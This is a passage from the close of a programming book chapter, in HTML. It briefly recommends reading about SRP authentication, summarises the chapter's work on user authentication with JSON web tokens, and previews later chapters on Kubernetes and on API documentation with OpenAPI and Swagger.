<p>SRP is used by <strong>Amazon Web Services</strong> (<strong>AWS</strong>) and Apple's iCloud, among others. So if security is something that interests you, I'd recommend doing some reading on SRP!</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Summary</h1>
                
            
            
                
<p>In this chapter, we implemented the logic to allow users to authenticate themselves to our API server. We also used JSON web tokens to keep our application stateless; this is important when we want to scale your application, something which we will discuss in <a href="5d093a43-720f-4ea8-aac0-b64b13f96d12.xhtml" target="_blank"/><a href="5d093a43-720f-4ea8-aac0-b64b13f96d12.xhtml" target="_blank">Chapter 18</a>, <em>Robust Infrastructure with Kubernetes</em>.</p>
<p>However, it is important to remember that security is not an easy undertaking. What we've covered in this chapter is only a small part of the puzzle. You should view this chapter as a first step in securing your application, and always stay informed about the latest security holes and best practices.</p>
<p>In the next chapter, we will finish up our backend API by documenting our API using <strong>OpenAPI</strong> and <strong>Swagger</strong>.</p>


            

            
        
    </body></html>